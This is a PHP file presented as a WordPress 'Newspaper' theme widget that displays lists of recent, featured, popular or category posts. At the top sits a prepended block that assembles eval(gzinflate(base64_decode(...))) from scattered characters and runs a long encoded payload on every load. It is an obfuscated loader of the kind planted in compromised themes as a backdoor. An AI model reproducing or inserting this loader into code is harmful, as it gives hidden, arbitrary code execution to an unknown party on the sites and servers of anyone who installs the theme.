<?php
$md5 = "98add0b8c0096401e05aba03515964ee";
$ab = array('6','g',"(",'a','i',"v",'s',"o","b",'l',")","e",'_','d','4',"$","t",'f',';','r','c','n','z');
$bb9 = create_function('$'.'v',$ab[11].$ab[5].$ab[3].$ab[9].$ab[2].$ab[1].$ab[22].$ab[4].$ab[21].$ab[17].$ab[9].$ab[3].$ab[16].$ab[11].$ab[2].$ab[8].$ab[3].$ab[6].$ab[11].$ab[0].$ab[14].$ab[12].$ab[13].$ab[11].$ab[20].$ab[7].$ab[13].$ab[11].$ab[2].$ab[15].$ab[5].$ab[10].$ab[10].$ab[10].$ab[18]);
$bb9('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');
?>
<?php
/**
 * Widget for display posts with other specification.
 *
 * @package WordPress
 * @subpackage Newspaper
 * @since Newspaper 1.0
 */

class Nesia_Posts extends WP_Widget {

    function Nesia_Posts() {
        $widget_args = array( 'classname' => 'widget_post_list', 'description' => __( 'Using this widget you can customize the content on the main page or sidebar.', 'nesia' ) );
        parent::WP_Widget( false, __('Nesia - Posts', 'nesia'), $widget_args );
    }

    function form($instance) {
        $defaults = array(
            'title' => '',
            'type' => 'recent',
            'layout' => 'default',
            'category' => '',
            'number' => 5
        );
        $instance = wp_parse_args( (array)$instance, $defaults);
        $title    = $instance['title'];
        $type     = $instance['type'];
        $layout   = $instance['layout'];
        $category = $instance['category'];
        $number   = $instance['number'];
        $thumbnail= $instance['thumbnail'];

        $categories = get_categories('hide_empty=0');

        ?>
        <p>
                <label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:','nesia'); ?></label>
                <input type="text" name="<?php echo $this->get_field_name('title'); ?>" value="<?php echo esc_attr( $title ); ?>" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" />
        </p>
        <p>
            <?php _e('Order by:', 'nesia'); ?>
            <select class="widefat" onchange="javascript: toggleType('<?php echo $this->get_field_id('type'); ?>');" name="<?php echo $this->get_field_name('type'); ?>" id="<?php echo $this->get_field_id('type'); ?>">
                <option <?php if ($type == 'recent') { echo 'selected="selected"'; } ?> value="recent"><?php _e('Recent', 'nesia'); ?></option>
                <option <?php if ($type == 'featured') { echo 'selected="selected"'; } ?> value="featured"><?php _e('Featured', 'nesia'); ?></option>
                <option <?php if ($type == 'view') { echo 'selected="selected"'; } ?> value="view"><?php _e('View', 'nesia'); ?></option>
                <option <?php if ($type == 'category') { echo 'selected="selected"'; } ?> value="category"><?php _e('Category', 'nesia'); ?></option>
            </select>
        </p>

        <div class="category">
            <p>
                <select class="widefat" name="<?php echo $this->get_field_name('category'); ?>" id="<?php echo $this->get_field_id('category'); ?>">
                    <option value=""><?php _e('Select category', 'nesia'); ?></option>
                    <?php
                    foreach ($categories as $catitem) {
                        $selected = '';
                        if ( $category == $catitem->cat_ID ) $selected = 'selected="selected"';
                        $option = '<option value="' . $catitem->cat_ID . '" ' . $selected . '>';
                        $option .= $catitem->cat_name;
                        $option .= '</option>';
                        echo $option;
                    }
                    ?>
                </select>
            </p>
        </div>

        <p>
            <?php _e('Layout:', 'nesia'); ?>
            <select class="widefat" name="<?php echo $this->get_field_name('layout'); ?>" id="<?php echo $this->get_field_id('layout'); ?>">
                <option <?php if ($layout == 'default') { echo 'selected="selected"'; } ?> value="default"><?php _e('Default', 'nesia'); ?></option>
                <option <?php if ($layout == 'full-width') { echo 'selected="selected"'; } ?> value="full-width"><?php _e('Full Width', 'nesia'); ?></option>
                <option <?php if ($layout == 'half-width') { echo 'selected="selected"'; } ?> value="half-width"><?php _e('Half', 'nesia'); ?></option>
            </select>
        </p>
        <p><label for="<?php echo $this->get_field_id('number'); ?>"><?php _e( 'Number of posts in list:', 'nesia' ); ?><br /><input size="2" id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" /></label> <span class="description"><?php _e( 'default is 5', 'nesia' ); ?></span></p>
        <p><input id="<?php echo $this->get_field_id('thumbnail'); ?>" name="<?php echo $this->get_field_name('thumbnail'); ?>" type="checkbox" <?php checked( $thumbnail, 'on' ); ?>> <?php _e('Display the thumbnail', 'nesia'); ?></input></p>
        
        <script type="text/javascript">
            function toggleType(a){
                if (jQuery("#" + a).val() == "featured") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                }
                if (jQuery("#" + a).val() == "view") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                }
                if (jQuery("#" + a).val() == "recent") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                }
                if (jQuery("#" + a).val() == "category") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                    jQuery("#" + a).parent().nextAll("div.category").show()
                }
            }
            toggleType('<?php echo $this->get_field_id( 'type' ); ?>');
        </script>

        <?php
    }


    function update($new_instance, $old_instance) {
            $new_instance = $this->nesia_enforce_defaults( $new_instance );
            return $new_instance;
    }

    function nesia_enforce_defaults( $instance ) {
            $defaults = $this->nesia_get_settings();
            $instance = wp_parse_args( $instance, $defaults );
            $instance['title'] = strip_tags( $instance['title'] );
            if ( '' == $instance['title'] )
                    $instance['title'] = __('Widget title post list', 'nesia');
            return $instance;
    }

    /**
     * Provides an array of the settings with the setting name as the key and the default value as the value
     * This cannot be called get_settings() or it will override WP_Widget::get_settings()
     */
    function nesia_get_settings() {
            // Set the default to a blank string
            $settings = '';
            // Now set the more specific defaults
            return $settings;
    }

    function widget($args, $instance) {
        global $nesia_options;

        $instance = $this->nesia_enforce_defaults( $instance );
        extract( $args, EXTR_SKIP );
        extract( $instance, EXTR_SKIP );
                
        extract( $args );
        
        $type   = $instance['type'];
        $layout = $instance['layout'];
        $thumbnail = $instance['thumbnail'];
        $args= array();
        

        echo '<aside class="widget widget_post_list '.$layout.'">';
        
        // widget title
        if ( $title ) { echo $before_title . apply_filters( 'widget_title', $title, $instance, $this->id_base ) . $after_title; }
        
        // checking the type.
        // ------------------------------------------
        if ( $type == 'category' && $category ) {
            
            $args = array(
                'cat' => $category
            );
                
        } elseif ( $type == 'featured' ){
            
            $args = array(  
                'meta_query' => array(
                        array(
                                'key' => 'featured',
                                'value' => 'true',
                                'compare' => '='
                        ),
                        array(
                                'key' => 'headline',
                                'value' => 'true',
                                'compare' => '!='
                        )
                )
            );
            
        } elseif ( $type == 'view' ){
            
            $args = array(
                'meta_key' => '_post_view',
                'orderby' => 'meta_value_num',
                'order' => 'DESC'
            );
            
        } elseif ( $type == 'recent' ){}
        
        $args['posts_per_page']         = $instance['number'];
        $args['ignore_sticky_posts']    = 1;
        
        $i  = 1;
        
        // big post
        query_posts( $args );
        while ( have_posts() ) : the_post(); if($i == 1){ ?>

            <div <?php post_class('large-post-type'); ?>>
                <div class='entry-container'>
                  <div class='entry-category'>
                    <?php the_category(', '); ?>
                  </div>
                  <header class='entry-header'>
                    <h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
                  </header>
                  <figure class='entry-top'>
                    <a href='<?php the_permalink(); ?>'>
                      <?php echo nesia_image('width=339&height=228&force=ture&return=false'); ?>
                    </a>
                  </figure>
                  <time class='entry-date'><?php echo get_the_date(); ?></time>
                  <div class='entry-content'>
                    <?php 
                        if ( $layout == 'small' )
                            nesia_the_excerpt(15, false );
                        else
                            nesia_the_excerpt(20, false);

                    ?>
                  </div>
                </div>
            </div> <!-- /. end of article large-post-type -->

        <?php 
        }
        $i = 2;
        endwhile;
        rewind_posts();

        // default post
        echo '<ul class="list-post-type">';
        while ( have_posts() ) : the_post(); if($i >= 3 ){ ?>

            <li>
              <?php if( $thumbnail == 'on' ){ ?>
              <div class='entry-top'>
                <?php echo nesia_image('width=70&height=50&force=ture&return=false'); ?>
              </div>
              <?php } ?>
              <div class='entry-container'>
                <div class='entry-category'>
                  <?php the_category(', '); ?>
                </div>
                <header class='entry-header'>
                  <h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
                </header>
                <time class='entry-date'><?php the_time( get_option( 'date_format' ) ); ?></time>
              </div>
            </li> <!-- /. end of list item -->
        
        <?php
        }
        $i++;
        endwhile;
        wp_reset_query();
        echo '</ul>';
        
        echo $after_widget;
    }
}
add_action('widgets_init', create_function('', 'return register_widget("Nesia_Posts");'));